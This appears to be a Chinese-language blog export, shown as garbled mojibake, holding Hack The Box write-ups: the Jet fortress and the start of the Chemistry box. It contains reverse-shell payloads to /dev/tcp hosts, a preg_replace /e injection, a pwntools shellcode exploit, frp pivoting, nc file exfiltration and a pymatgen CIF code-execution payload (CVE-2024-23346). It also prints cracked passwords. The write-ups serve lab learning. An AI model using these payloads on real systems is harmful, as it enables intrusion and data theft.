·å‘é€é‚®ä»¶\nå¾—åˆ°çš„ç»“æœğŸ‘‡å¯ä»¥çœ‹åˆ°é‚®ä»¶å†…å®¹è¢«æ›¿æ¢äº†\nåˆ†æPostçš„å‚æ•°å¯ä»¥å‘ç°ï¼Œä¾‹å¦‚ï¼šswearwords[/ass/i]=behindï¼Œé‡Œé¢ä¼¼ä¹æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œå¹¶ä¸”ä½¿asså¿½ç•¥å¤§å°å†™è½¬æ¢ä¸ºbehindï¼Œå¦‚æœå°†æ­£åˆ™è¡¨è¾¾å¼æ”¹ä¸º/eä¿®é¥°ç¬¦é‚£ä¹ˆå°±å­˜åœ¨preg_replaceçš„å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œè¿™ä¸ªä¹Ÿæ˜¯åœ¨CTFä¸­å¸¸è§çš„è€ƒç‚¹ã€‚\nè¿™é‡Œå¯ä»¥æ‹¿ä¸€ä¸ªç¤ºä¾‹è¿›è¡Œåˆ†æ\npreg_replaceï¼ˆ$badwordï¼Œ $replacementï¼Œ $strï¼‰; è¿™é‡Œçš„badwordä¹Ÿå°±æ˜¯éœ€è¦åŒ¹é…çš„æ¨¡å¼ï¼Œè¿™ä¸ªæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„\nreplacementä¹Ÿå°±æ˜¯ç­‰å·åé¢çš„å€¼ï¼Œstråº”è¯¥æ˜¯Messageä¸­çš„å†…å®¹\nå¦‚æœå°†badwordæŒ‡å®šä¸ºæ¯”å¦‚è¯´/ass/eï¼ŒreplacementæŒ‡å®šä¸ºä¸€ä¸ªç³»ç»Ÿå‡½æ•°å‘½ä»¤é‚£ä¹ˆå°±å¯ä»¥æ‰§è¡Œå‘½ä»¤\nå¦‚ä¸Šå›¾ï¼Œæ‰‹åŠ¨å»æ‰messageçš„htmlæ ‡ç­¾ï¼Œç„¶åä¿®æ”¹æ­£åˆ™åŒ¹é…å’Œå‘½ä»¤ï¼Œç„¶åForwardå‘é€åŒ…ï¼ŒæˆåŠŸå¾—åˆ°å›æ˜¾\næˆ‘ä»¬å¯ä»¥å°†æ›¿æ¢æ–‡æœ¬è®¾ç½®ä¸ºğŸ‘‡ï¼Œè¿›è¡Œåå¼¹shellï¼Œæ–¹ä¾¿æ“ä½œ\nsystem(\u0026#34;echo%20\u0026#39; YourBase64Here \u0026#39;|base64%20-d|bash\u0026#34;);\r# /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.xx.xx/200 0\u0026gt;\u0026amp;1 ç›´æ¥è¯»å–flag\nJET{pr3g_r3pl4c3_g3ts_y0u_pwn3d} Overflown #\ræ¶‰åŠåˆ°Pwnçš„çŸ¥è¯†æˆ‘ä¹Ÿä¸æ˜¯å¾ˆæ‡‚ï¼Œå°±ä»æˆ‘çš„è§’åº¦è¿›è¡Œåˆ†æã€‚\nåœ¨/homeç›®å½•ä¸‹å‘ç°ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶leak\nä½¿ç”¨ncå°†æ–‡ä»¶ä¼ å‡ºæ¥çœ‹çœ‹\nwww-data@jet:/home$ nc 10.10.16.2 6666 \u0026lt; leak\r[root@kali] /home/kali â¯ nc -lvnp 6666 \u0026gt; leak checksecæŸ¥çœ‹ä¸€ä¸‹ç»“æ„\n[root@kali] /home/kali/Desktop â¯ checksec leak [*] \u0026#39;/home/kali/Desktop/leak\u0026#39;\rArch: amd64-64-little\rRELRO: Partial RELRO\rStack: No canary found\rNX: NX unknown - GNU_STACK missing\rPIE: No PIE (0x400000)\rStack: Executable\rRWX: Has RWX segments\rStripped: No æŸ¥çœ‹IDAçš„ä¼ªä»£ç ï¼Œå¹¶æ²¡æœ‰çœ‹åˆ°å…¶ä»–çš„ä¸€äº›æ˜æ˜¾çš„systemå‡½æ•°ï¼Œåº”è¯¥æ˜¯è¦è‡ªå·±å†™å…¥\nint __cdecl main(int argc, const char **argv, const char **envp)\r{\rchar s[64]; // [rsp+0h] [rbp-40h] BYREF\r_init();\rprintf(\u0026#34;Oops, I\u0026#39;m leaking! %p\\n\u0026#34;, s);\rputs(aPwnMe);\rprintf(\u0026#34;\u0026gt; \u0026#34;);\rfgets(s, 512, stdin);\rreturn 0;\r} æœ€å¼€å§‹æš´éœ²å‡ºæ¥äº†æ•°ç»„Sçš„åœ°å€ï¼Œä½¿ç”¨Pwndbgè¿›è¡Œè°ƒè¯•ï¼Œå¯ä»¥çœ‹åˆ°æ ˆåŒºæ˜¯å­˜åœ¨å¯è¯»å¯å†™å¯æ‰§è¡Œçš„æƒé™çš„ã€‚å› æ­¤å¯ä»¥è€ƒè™‘æ ˆæº¢å‡ºä¸­çš„ret2shellcode\nå¤§æ¦‚æ€è·¯å°±æ˜¯ï¼Œå°†Shellcodeå†™å…¥åˆ°æ•°ç»„Sä¸­ï¼Œå¹¶ä¸”æ„é€ æ ˆæº¢å‡ºä½¿è¿”å›åœ°å€é‡æ–°å›åˆ°æ•°ç»„Sç«¯ï¼Œå¹¶ä¸”ç»§ç»­æ‰§è¡ŒShellcodeï¼Œè‡³äºæ‰§è¡Œå®ŒShellcodeåçš„è¿”å›åœ°å€ï¼Œæˆ‘ä»¬å¹¶ä¸å…³å¿ƒã€‚å¯ä»¥å¯¹ç…§ä¸‹å›¾çœ‹\nfrom pwn import *\rio = process(\u0026#39;./leak\u0026#39;)\rio.recvuntil(b\u0026#34;Oops, I\u0026#39;m leaking! \u0026#34;)\rleak_addr=int(io.recvuntil(\u0026#39;\\n\u0026#39;),16)\rshellcode = b\u0026#34;\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05\u0026#34;\rio.recvuntil(b\u0026#34;\u0026gt; \u0026#34;)\rio.sendline(shellcode.ljust(72,b\u0026#39;a\u0026#39;) +p64(leak_addr))\rio.interactive() æ¥ä¸‹æ¥å°±æ˜¯è¦æŠŠleakäºŒè¿›åˆ¶æ–‡ä»¶æŒ‚è½½åˆ°ä¸€ä¸ªç«¯å£ä¸Šï¼Œæ¯”è¾ƒç®€å•çš„åšæ³•æ˜¯ç”¨nc -eè¿›è¡ŒæŒ‚è½½ï¼Œä¸è¿‡è¿™é‡Œçš„ncç‰ˆæœ¬ä¸å¯¹ï¼Œä¸èƒ½ç”¨è¿™ä¸ªå‚æ•°ã€‚è¯¢é—®ChatGPTï¼Œä»–ç»™äº†æˆ‘è¿™ä¸ªå‘½ä»¤socat\nsocat TCP4-LISTEN:13145,reuseaddr,fork EXEC:/home/leak \u0026amp; ç°åœ¨çš„é—®é¢˜å°±æ˜¯ï¼Œä¼¼ä¹ä»kaliæ— æ³•ç›´æ¥nc 10.13.37.10 13145ç«¯å£ï¼Œè€Œåœ¨åå¼¹shellé‡Œçš„æ˜¯èƒ½nc 127.0.0.1 13145ï¼Œå¤§æ¦‚ç‡æ˜¯ä¸å‡ºç½‘çš„é—®é¢˜ï¼Œå¯ä»¥çœ‹åˆ°ä»–åªæœ‰ä¸¤ä¸ªå†…ç½‘IP\næ—¢ç„¶åå¼¹shellçš„æœºå™¨èƒ½å¤Ÿè®¿é—®æˆ‘çš„kaliï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•ä½¿ç”¨frpæ­å»ºä»£ç†ï¼Œç„¶åä»£ç†è®¿é—®å†…ç½‘æŒ‚è½½leakçš„ç«¯å£ï¼Œå®ç°æ”»å‡»\n[github author=\u0026ldquo;fatedier\u0026rdquo; project=\u0026ldquo;frp\u0026rdquo;][/github]\nä¸‹è½½amd64ç‰ˆæœ¬ï¼Œç„¶åå¦‚ä¸‹é…ç½®ï¼Œå…¶ä¸­server_addræ˜¯kaliçš„å†…ç½‘IPï¼Œremote_portæ˜¯ä½¿ç”¨ä»£ç†çš„ç«¯å£\n[root@kali] /home/kali/Desktop/frp_0.61.0_linux_amd64 â¯ cat frps.ini [common]\rbind_port = 7000\r[root@kali] /home/kali/Desktop/frp_0.61.0_linux_amd64 â¯ cat frpc.ini\r[common]\rserver_addr = 10.10.xx.xx server_port = 7000 tls_enable = ture [plugin socks]\rtype = tcp plugin = socks5 remote_port = 46075 use_encryption = true\ruse_compression = true å°†frpcå’Œfrpc.inié€šè¿‡pythonçš„httpæ¨¡å—ä¸Šä¼ åˆ°ç›®æ ‡æœºå™¨çš„/tmpç›®å½•ä¸‹å¹¶ä¸”èµ‹äºˆæƒé™\nå…ˆæ‰“å¼€kaliçš„æœåŠ¡ç«¯ï¼Œå†æ‰“å¼€åå¼¹shellçš„å®¢æˆ·ç«¯\nä¿®æ”¹/etc/proxychains4.confå¦‚ä¸‹\næŒ‚è½½leakäºŒè¿›åˆ¶æ–‡ä»¶\nwww-data@jet:/home$ socat TCP4-LISTEN:13145,reuseaddr,fork EXEC:/home/leak \u0026amp; å¦‚å›¾åˆ™è¡¨ç¤ºä»£ç†æ­å»ºæˆåŠŸğŸ‘‡\næœ€åå°†poc.pyä¿®æ”¹ä¸ºè¿œç¨‹è¿æ¥å³å¯\nfrom pwn import *\r#io = process(\u0026#39;./leak\u0026#39;)\rio = remote(\u0026#34;192.168.122.100\u0026#34;,13145)\rio.recvuntil(b\u0026#34;Oops, I\u0026#39;m leaking! \u0026#34;)\rleak_addr=int(io.recvuntil(b\u0026#39;\\n\u0026#39;),16)\rshellcode = b\u0026#34;\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05\u0026#34;\rio.recvuntil(b\u0026#34;\u0026gt; \u0026#34;)\rio.sendline(shellcode+(72-len(shellcode))*b\u0026#39;a\u0026#39; +p64(leak_addr))\rio.interactive() æœ€åä»£ç†æ‰§è¡Œæ‹¿åˆ°flag\nJET{0v3rfL0w_f0r_73h_lulz} Secret Message #\råœ¨alexç›®å½•ä¸‹å‘ç°äº†ä¸€äº›æ–‡ä»¶ï¼Œå°†å…¶zipæ‰“åŒ…ç”¨ncä¼ å‡ºæ¥\n$ cd /home/alex\r$ zip -r alex.zip .\r$ nc 10.10.xx.xx 9855 \u0026lt; alex.zip\r[root@kali] /home/kali/Jet â¯ nc -lvnp 9855 \u0026gt; alex.zip ä¸€å…±æœ‰ä¸‰ä¸ªæ–‡ä»¶\n[root@kali] /home/kali/Jet â¯ cat crypter.py import binascii\rdef makeList(stringVal):\rlist = []\rfor c in stringVal:\rlist.append(c)\rreturn list\rdef superCrypt(stringVal,keyVal):\rkeyPos = 0\rkey = makeList(keyVal)\rxored = []\rfor c in stringVal:\rxored.append(binascii.hexlify(chr(ord(c) ^ ord(keyVal[keyPos]))))\rif keyPos == len(key) - 1:\rkeyPos = 0\relse:\rkeyPos += 1\rhexVal = \u0026#39;\u0026#39;\rfor n in xored:\rhexVal += n\rreturn hexVal\rwith open(\u0026#39;message.txt\u0026#39;) as f:\rcontent = f.read()\rkey = sys.argv[1]\rwith open(\u0026#39;encrypted.txt\u0026#39;, \u0026#39;w\u0026#39;) as f:\routput = f.write(binascii.unhexlify(superCrypt(content, key))) encrypted.txtåº”è¯¥æ˜¯åŠ å¯†åçš„æ–‡æœ¬ï¼Œexploitme.zipéœ€è¦å¯†ç æ‰èƒ½è§£å‹\nChatGPTå¯¹ä¸Šé¢çš„è„šæœ¬è§£é‡Šï¼šè¿™æ®µä»£ç å®ç°çš„æ˜¯ä¸€ç§åŸºäº å¼‚æˆ–ï¼ˆXORï¼‰æ“ä½œ çš„åŠ å¯†æ–¹å¼ã€‚\nç”±äºæ²¡æœ‰å¯†é’¥è¿›è¡Œåå¼‚æˆ–ï¼Œéœ€è¦ä½¿ç”¨åˆ°ä¸€ä¸ªå·¥å…·Featherduster\n[github author=\u0026ldquo;nccgroup\u0026rdquo; project=\u0026ldquo;featherduster\u0026rdquo;][/github]\ngit clone https://github.com/nccgroup/featherduster\rdocker build -t featherduster . è§£å¯†å¾—åˆ°å¦‚ä¸‹æ–‡æœ¬ï¼Œå¯†é’¥æ˜¯ï¼šsecurewebincrocks\nHello mate!\rFirst of all an important finding regarding our website: Login is prone to SQL injection! Ask the developers to fix it asap!\rRegarding your training material, I added the two binaries for the remote exploitation training in exploitme.zip. The password is the same we use to encrypt our communications.\rMake sure those binaries are kept safe!\rTo make your life easier I have already spawned instances of the vulnerable binaries listening on our server.\rThe ports are 5555 and 7777.\rHave fun and keep it safe!\rJET{r3p3at1ng_ch4rs_1n_s1mpl3_x0r_g3ts_y0u_0wn3d}\rCheers - Alex\r-----------------------------------------------------------------------------\rThis email and any files transmitted with it are confidential and intended solely for the use of the individual or entity to whom they are addressed. If you have received this email in error please notify the system manager. This message contains confidential information and is intended only for the individual named. If you are not the named addressee you should not disseminate, distribute or copy this e-mail. Please notify the sender immediately by e-mail if you have received this e-mail by mistake and delete this e-mail from your system. If you are not the intended recipient you are notified that disclosing, copying, distributing or taking any action in reliance on the contents of this information is strictly prohibited.\r----------------------------------------------------------------------------- Elasticity #\rä½¿ç”¨nmapè¿›è¡Œå…¨ç«¯å£æ‰«æ\n[root@kali] /home/kali/Jet â¯ nmap 10.13.37.10 -p- Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-19 19:22 CST\rStats: 0:02:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 26.57% done; ETC: 19:30 (0:05:51 remaining)\rNmap scan report for www.securewebinc.jet (10.13.37.10)\rHost is up (0.37s latency).\rNot shown: 65528 closed tcp ports (reset)\rPORT STATE SERVICE\r22/tcp open ssh\r53/tcp open domain\r80/tcp open http\r2222/tcp open EtherNetIP-1\r5555/tcp open freeciv\r7777/tcp open cbt\r9201/tcp open wap-wsp-wtp\rNmap done: 1 IP address (1 host up) scanned in 1291.19 seconds æŸ¥çœ‹å†…ç½‘ç«¯å£å¼€æ”¾çš„æƒ…å†µ\nwww-data@jet:/$ netstat -tuln\rnetstat -tuln\rActive Internet connections (only servers)\rProto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:13145 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:953 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:25825 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:7777 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:6321 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:9201 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:5555 0.0.0.0:* LISTEN tcp 0 0 192.168.122.100:53 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:53 0.0.0.0:* LISTEN tcp6 0 0 :::22 :::* LISTEN tcp6 0 0 ::1:953 :::* LISTEN tcp6 0 0 :::25825 :::* LISTEN tcp6 0 0 127.0.0.1:9200 :::* LISTEN tcp6 0 0 127.0.0.1:9300 :::* LISTEN tcp6 0 0 :::53 :::* LISTEN udp 0 0 192.168.122.100:53 0.0.0.0:* udp 0 0 127.0.0.1:53 0.0.0.0:* udp6 0 0 :::53 :::* å¯ä»¥æ³¨æ„åˆ°9200å’Œ9300ç«¯å£å¼€æ”¾ï¼Œä»–ä»¬ä¸»è¦æ˜¯ElasticSearchæœåŠ¡ä½¿ç”¨çš„ç«¯å£\nç”±äºç»‘å®šçš„æ˜¯127.0.0.1è¿™é‡Œä½¿ç”¨ä»£ç†ä¹Ÿæ— æ³•è®¿é—®ï¼Œéœ€è¦åœ¨æœ¬åœ°è¿›è¡Œä¸€æ¬¡ç«¯å£è½¬å‘\nsocat tcp-listen:9999,reuseaddr,fork tcp:localhost:9300 \u0026amp; ç„¶åæˆ‘å°±æ— æ³•æ­£å¸¸Curlé€šé‚£å‡ ä¸ªç«¯å£äº†ï¼Œå³ä½¿åœ¨åå¼¹Shellé‡Œä¹Ÿæ— æ³•è¿æ¥ï¼Œä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Ÿ\næˆ‘è¿™é‡Œå°±å¼•ç”¨ä¸€ä¸‹åˆ«äººçš„Pocå§\nimport java.net.InetSocketAddress;\rimport java.net.InetAddress;\rimport java.util.Map;\rimport org.elasticsearch.action.admin.indices.exists.indices.IndicesExistsResponse;\rimport org.elasticsearch.action.admin.cluster.health.ClusterHealthResponse;\rimport org.elasticsearch.action.admin.indices.get.GetIndexResponse;\rimport org.elasticsearch.action.admin.indices.get.GetIndexRequest;\rimport org.elasticsearch.transport.client.PreBuiltTransportClient;\rimport org.elasticsearch.cluster.health.ClusterIndexHealth;\rimport org.elasticsearch.common.transport.TransportAddress;\rimport org.elasticsearch.client.transport.TransportClient;\rimport org.elasticsearch.action.search.SearchResponse;\rimport org.elasticsearch.client.IndicesAdminClient;\rimport org.elasticsearch.common.settings.Settings;\rimport org.elasticsearch.search.SearchHit;\rimport org.elasticsearch.client.Client;\rpublic class Program {\rpublic static void main(String[] args) {\rbyte[] ipAddr = new byte[]{10, 13, 37, 10};\rClient client = new PreBuiltTransportClient(Settings.EMPTY)\r.addTransportAddress(new TransportAddress(new InetSocketAddress(\u0026#34;10.13.37.10\u0026#34;, 9999)));\rSystem.out.println(client.toString());\rClusterHealthResponse healths = client.admin().cluster().prepareHealth().get();\rfor (ClusterIndexHealth health : healths.getIndices().values()) {\rString index = health.getIndex();\rSystem.out.println(index);\r}\rSearchResponse searchResponse = client.prepareSearch(\u0026#34;test\u0026#34;).execute().actionGet();\rSearchHit[] results = searchResponse.getHits().getHits();\rfor(SearchHit hit : results){\rString sourceAsString = hit.getSourceAsString();\rSystem.out.println(sourceAsString);\r}\rclient.close();\r}\r} ç¼–è¯‘è¿è¡Œå¾—åˆ°å¦‚ä¸‹\n{\r\u0026#34;timestamp\u0026#34;: \u0026#34;2017-11-13 08:31\u0026#34;,\r\u0026#34;subject\u0026#34;: \u0026#34;Just a heads up Rob\u0026#34;,\r\u0026#34;category\u0026#34;: \u0026#34;admin\u0026#34;,\r\u0026#34;draft\u0026#34;: \u0026#34;no\u0026#34;,\r\u0026#34;body\u0026#34;: \u0026#34;Hey Rob - just so you know, that information you wanted has beensent.\u0026#34;\r}\r{\r\u0026#34;timestamp\u0026#34;: \u0026#34;2017-11-10 07:00\u0026#34;,\r\u0026#34;subject\u0026#34;: \u0026#34;Maintenance\u0026#34;,\r\u0026#34;category\u0026#34;: \u0026#34;maintenance\u0026#34;,\r\u0026#34;draft\u0026#34;: \u0026#34;no\u0026#34;,\r\u0026#34;body\u0026#34;: \u0026#34;Performance to our API has been reduced for a period of 3 hours. Services have been distributed across numerous suppliers, in order to reduce any future potential impact of another outage, as experienced yesterday\u0026#34;\r}\r{\r\u0026#34;timestamp\u0026#34;: \u0026#34;2017-11-13 08:30\u0026#34;,\r\u0026#34;subject\u0026#34;: \u0026#34;Details for upgrades to EU-API-7\u0026#34;,\r\u0026#34;category\u0026#34;: \u0026#34;admin\u0026#34;,\r\u0026#34;draft\u0026#34;: \u0026#34;yes\u0026#34;,\r\u0026#34;body\u0026#34;: \u0026#34;Hey Rob, you asked for the password to the EU-API-7 instance. You didn not want me to send it on Slack, so I am putting it in here as a draft document. Delete this once you have copied the message, and don _NOT_ tell _ANYONE_. We need a better way of sharing secrets. The password is purpl3un1c0rn_1969. -Jason JET{3sc4p3_s3qu3nc3s_4r3_fun}\u0026#34;\r}\r{\r\u0026#34;timestamp\u0026#34;: \u0026#34;2017-11-13 13:32\u0026#34;,\r\u0026#34;subject\u0026#34;: \u0026#34;Upgrades complete\u0026#34;,\r\u0026#34;category\u0026#34;: \u0026#34;Maintenance\u0026#34;,\r\u0026#34;draft\u0026#34;: \u0026#34;no\u0026#34;,\r\u0026#34;body\u0026#34;: \u0026#34;All upgrades are complete, and normal service resumed\u0026#34;\r}\r{\r\u0026#34;timestamp\u0026#34;: \u0026#34;2017-11-09 15:13\u0026#34;,\r\u0026#34;subject\u0026#34;: \u0026#34;Server outage\u0026#34;,\r\u0026#34;category\u0026#34;: \u0026#34;outage\u0026#34;,\r\u0026#34;draft\u0026#34;: \u0026#34;no\u0026#34;,\r\u0026#34;body\u0026#34;: \u0026#34;Due to an outage in one of our suppliers, services were unavailable for approximately 8 hours. This has now been resolved, and normal service resumed\u0026#34;\r}\r{\r\u0026#34;timestamp\u0026#34;: \u0026#34;2017-11-13 13:40\u0026#34;,\r\u0026#34;subject\u0026#34;: \u0026#34;Thanks Jazz\u0026#34;,\r\u0026#34;category\u0026#34;: \u0026#34;admin\u0026#34;,\r\u0026#34;draft\u0026#34;: \u0026#34;no\u0026#34;,\r\u0026#34;body\u0026#34;: \u0026#34;Thanks dude - all done. You can delete our little secret. Kind regards, Rob\u0026#34;\r}\r{\r\u0026#34;timestamp\u0026#34;: \u0026#34;2017-11-13 08:27\u0026#34;,\r\u0026#34;subject\u0026#34;: \u0026#34;Upgrades\u0026#34;,\r\u0026#34;category\u0026#34;: \u0026#34;maintenance\u0026#34;,\r\u0026#34;draft\u0026#34;: \u0026#34;no\u0026#34;,\r\u0026#34;body\u0026#34;: \u0026#34;An unscheduled maintenance period will occur at 12:00 today for approximately 1 hour. During this period, response times will be reduced while services have critical patches applied to them across all suppliers and instances\u0026#34;\r} End\u0026hellip;.. #\rç¬¬ä¸€æ¬¡åšFortressesé‡Œé¢çš„é¢˜ç›®ï¼Œæ„Ÿè§‰ç»¼åˆæ€§éå¸¸å¼ºï¼Œæ¶‰åŠåˆ°å¾ˆå¤šä¸œè¥¿ï¼Œä¸ä»…é™äºWebã€Pwnï¼Œç”šè‡³è¿˜æœ‰ä¸€äº›å¯†ç çš„æ€è·¯ã€‚åé¢è¿˜æœ‰å‡ ä¸ªTaskï¼Œæˆ‘è§‰å¾—ä¹Ÿä¸å¤ªå¥½åšäº†ï¼Œè¿™ç¯‡æ–‡ç« å°±åˆ°è¿™é‡Œå§ã€‚\nBye~~ğŸ˜œ\n","date":"2024-12-19","externalUrl":null,"permalink":"/posts/2024/12/fortresses-jet/","section":"Posts","summary":"","title":"Fortresses-Jet","type":"posts"},{"content":"","date":"2024-12-19","externalUrl":null,"permalink":"/categories/htb-fortresses/","section":"Categories","summary":"","title":"Htb-Fortresses","type":"categories"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali â¯ nmap Chemistry.htb -sS -Pn -T4 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-17 20:11 CST\rNmap scan report for Chemistry.htb (10.10.11.38)\rHost is up (0.10s latency).\rNot shown: 998 closed tcp ports (reset)\rPORT STATE SERVICE\r22/tcp open ssh\r5000/tcp open upnp\rNmap done: 1 IP address (1 host up) scanned in 1.78 seconds å¼€æ”¾ç«¯å£ï¼š22ã€5000\nè¿›å…¥http://chemistry.htb:5000/\nå¯ä»¥è¿›è¡ŒCIFæ™¶ä½“å­¦ä¿¡æ¯æ–‡ä»¶(Crystallographic Information File)æ–‡ä»¶ä¸Šä¼ \nç»™å‡ºçš„ç¤ºä¾‹æ–‡ä»¶å†…å®¹æ˜¯è¿™æ ·çš„\n[root@kali] /home/kali/Downloads â¯ cat example.cif data_Example\r_cell_length_a 10.00000\r_cell_length_b 10.00000\r_cell_length_b 10.00000\r_cell_angle_alpha 90.00000\r_cell_angle_beta 90.00000\r_cell_angle_gamma 90.00000\r_symmetry_space_group_name_H-M \u0026#39;P 1\u0026#39;\rloop_\r_atom_site_label\r_atom_site_fract_x\r_atom_site_fract_y\r_atom_site_fract_z\r_atom_site_occupancy\rH 0.00000 0.00000 0.00000 1\rO 0.50000 0.50000 0.50000 1 CVE-2024-23346 #\rç»è¿‡Googleæœå¯»è¿™ä¸ªCIFæ–‡ä»¶ç›¸å…³çš„CVEï¼Œæˆ‘æ‰¾åˆ°äº†è¿™ä¸ªğŸ‘‡\nCritical Security Flaw in Pymatgen Library (CVE-2024-23346) - vsociety (vicarius.io)\nArbitrary code execution when parsing a maliciously crafted JonesFaithfulTransformation transformation_string Â· Advisory Â· materialsproject/pymatgen (github.com)\nåœ¨Githubé‡Œç»™å‡ºçš„PocåŸå‹æ˜¯è¿™æ ·çš„\ndata_5yOhtAoR\r_audit_creation_date 2018-06-08\r_audit_creation_method \u0026#34;Pymatgen CIF Parser Arbitrary Code Execution Exploit\u0026#34;\rloop_\r_parent_propagation_vector.id\r_parent_propagation_vector.kxkykz\rk1 [0 0 0]\r_space_group_magn.transform_BNS_Pp_abc \u0026#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[\u0026#34;__sub\u0026#34; + \u0026#34;classes__\u0026#34;]) () if d.__name__ == \u0026#34;BuiltinImporter\u0026#34;][0].load_module (\u0026#34;os\u0026#34;).system (\u0026#34;touch pwned\u0026#34;);0,0,0\u0026#39;\r_space_group_magn.number_BNS 62.448\r_space_group_magn.name_BNS \u0026#34;P n\u0026#39; m a\u0026#39; \u0026#34; æœ‰æ•ˆè½½è·å°±æ˜¯ä¸‹é¢çš„_space_group_magné‚£ä¸€æ®µï¼Œå› æ­¤ä»¿ç…§è¿™ä¸ªPocæ„é€ ä¸€ä¸ªåå¼¹shellï¼ˆæ³¨æ„å•å¼•å·çš„è½¬ä¹‰ï¼Œå› ä¸ºæœ€å¤–é¢æ˜¯æœ‰ä¸€å±‚å•å¼•å·åŒ…è£¹çš„ï¼‰\n[root@kali] /home/kali/Downloads â¯ cat example.cif data_Example\r_cell_length_a 10.00000\r_cell_length_b 10.00000\r_cell_length_c 10.00000\r_cell_angle_alpha 90.00000\r_cell_angle_beta 90.00000\r_cell_angle_gamma 90.00000\r_symmetry_space_group_name_H-M \u0026#39;P 1\u0026#39;\rloop_\r_atom_site_label\r_atom_site_fract_x\r_atom_site_fract_y\r_atom_site_fract_z\r_atom_site_occupancy\rH 0.00000 0.00000 0.00000 1\rO 0.50000 0.50000 0.50000 1\r_space_group_magn.transform_BNS_Pp_abc \u0026#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[\u0026#34;__sub\u0026#34; + \u0026#34;classes__\u0026#34;]) () if d.__name__ == \u0026#34;BuiltinImporter\u0026#34;][0].load_module (\u0026#34;os\u0026#34;).system (\u0026#34;/bin/bash -c \\\u0026#39;sh -i \u0026gt;\u0026amp; /dev/tcp/10.10.xx.xx/100 0\u0026gt;\u0026amp;1\\\u0026#39;\u0026#34;);0,0,0\u0026#39;\r_space_group_magn.number_BNS 62.448\r_space_group_magn.name_BNS \u0026#34;P n\u0026#39; m a\u0026#39; \u0026#34; è®¾ç½®ç›‘å¬ï¼Œä¸Šä¼ ä¹‹åç‚¹å‡»ViewæŸ¥çœ‹ï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸåå¼¹åˆ°Shell\npython3 -c \u0026#34;import pty;pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34; åœ¨instanceç›®å½•ä¸‹å‘ç°ä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶\nå¯ä»¥å¼€å¯ä¸€ä¸ªhttpserverçš„æœåŠ¡å°†å…¶ä¸‹è½½ä¸‹æ¥\næˆ‘åœ¨/homeç›®å½•ä¸‹å‘ç°äº†å¦ä¸€ä¸ªç”¨æˆ·ï¼šrosaï¼Œå¹¶ä¸”database.dbä¸­ä¹Ÿå­˜åœ¨ä»–çš„å¯†ç hashï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨John The Ripperè¿›è¡Œçˆ†ç ´å¯†ç \n[root@kali] /home/kali/Chemistry â¯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 â\rUsing default input encoding: UTF-8\rLoaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])\rWarning: no OpenMP support for this hash type, consider --fork=4\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\runicorniosrosados (?) 1g 0:00:00:00 DONE (2024-12-17 20:57) 1.265g/s 3774Kp/s 3774Kc/s 3774KC/s uniden206..unicornios2805\rUse the \u0026#34;--show --format=Raw-MD5\u0026#34; options to display all of the cracked passwords reliably\rSession completed. å¾—åˆ°ç”¨æˆ·å¯†ç \nusernameï¼šrosa\rpasswordï¼šunicorniosrosados SSHç›´æ¥ç™»å½•è·å–åˆ°User.txt\nReadAnyFiles #\rä¸Šä¼ linpeasï¼Œå‘ç°å­˜åœ¨å¼€æ”¾çš„å†…ç½‘ç«¯å£\nâ•”â•â•â•â•â•â•â•â•â•â•â•£ Active Ports\râ•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports tcp 0 0 0.0.0.0:5000 0.0.0.0:* LISTEN 7928/bash tcp 0 0 0.0.0.0:9999 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8080 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::22 :::* LISTEN - å°†8080ç«¯å£ä»£ç†å‡ºæ¥ï¼Œæˆ‘è¿™é‡Œæ˜¯ä»£ç†åˆ°äº†æœ¬åœ°çš„8000ç«¯å£ï¼Œå› ä¸º8080ç«¯å£æ˜¯Bursuiteçš„é»˜è®¤ä½¿ç”¨ç«¯å£\nServerï¼šPython/3.9 aiohttp/3.9.1 